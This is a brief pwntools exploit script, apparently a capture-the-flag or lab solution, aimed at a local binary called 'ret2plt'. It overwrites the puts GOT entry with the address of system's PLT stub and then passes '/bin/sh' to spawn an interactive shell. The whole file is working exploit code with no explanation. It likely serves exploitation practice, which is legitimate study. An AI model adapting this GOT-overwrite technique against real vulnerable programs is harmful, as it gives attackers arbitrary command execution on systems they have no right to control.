from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

puts_got = 0x404018
system_plt = 0x4010a0

r = process('./ret2plt')

r.sendlineafter(b': ', str(puts_got).encode())
r.send(p64(system_plt))

r.sendlineafter(b': ', b'/bin/sh')

r.interactive()